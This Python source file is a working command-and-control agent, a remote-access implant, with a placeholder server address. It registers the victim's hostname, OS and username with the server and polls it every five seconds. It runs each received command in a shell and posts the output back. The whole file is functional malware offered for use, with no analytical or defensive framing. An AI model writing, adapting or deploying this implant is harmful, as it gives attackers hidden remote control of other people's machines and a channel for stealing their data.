import requests
import subprocess
import platform
import os
import time
import uuid
import json

class C2Agent:
    def __init__(self, c2_server, port=8080):
        self.c2_url = f"http://{c2_server}:{port}"
        self.agent_id = str(uuid.uuid4())[:8]
        self.sleep_time = 5  # checkin every 5 seconds
        self.running = True

    def register(self):
        """Register with C2 server"""
        data = {
            'agent_id': self.agent_id,
            'hostname': platform.node(),
            'os': platform.system() + " " + platform.release(),
            'user': os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        }
        try:
            r = requests.post(
                f"{self.c2_url}/register",
                json=data, timeout=10
            )
            if r.status_code == 200:
                print(f"[+] Registered with C2. Agent ID: {self.agent_id}")
                return True
        except Exception as e:
            print(f"[-] Registration failed: {e}")
        return False

    def checkin(self):
        """Check in with C2 and get commands"""
        try:
            r = requests.get(
                f"{self.c2_url}/checkin/{self.agent_id}",
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                return data.get('command'), data.get('cmd_id')
        except:
            pass
        return None, None

    def execute_command(self, command):
        """Execute a shell command and return output"""
        try:
            if command == "sleep":
                return None

            # Special commands
            if command.startswith("cd "):
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to {path}"

            if command == "whoami":
                return os.getenv('USER') or os.getenv('USERNAME')

            if command == "sysinfo":
                return f"""
OS: {platform.system()} {platform.release()}
Hostname: {platform.node()}
User: {os.getenv('USER')}
CWD: {os.getcwd()}
"""
            # Execute shell command
            result = subprocess.run(
                command, shell=True,
                capture_output=True, text=True, timeout=30
            )
            output = result.stdout or result.stderr
            return output if output else "(no output)"

        except subprocess.TimeoutExpired:
            return "[-] Command timed out"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def send_result(self, cmd_id, output):
        """Send command result back to C2"""
        try:
            requests.post(
                f"{self.c2_url}/result",
                json={
                    'agent_id': self.agent_id,
                    'cmd_id': cmd_id,
                    'output': output
                },
                timeout=10
            )
        except:
            pass

    def run(self):
        """Main agent loop"""
        if not self.register():
            return

        print(f"[*] Agent running. Checking in every {self.sleep_time}s...")
        while self.running:
            command, cmd_id = self.checkin()
            
            if command and command != "sleep":
                print(f"[*] Executing: {command}")
                output = self.execute_command(command)
                if output:
                    self.send_result(cmd_id, output)
            
            time.sleep(self.sleep_time)


if __name__ == "__main__":
    # Change this to your C2 server IP
    agent = C2Agent(c2_server="YOur__IP_Addr", port=8080)
    agent.run()

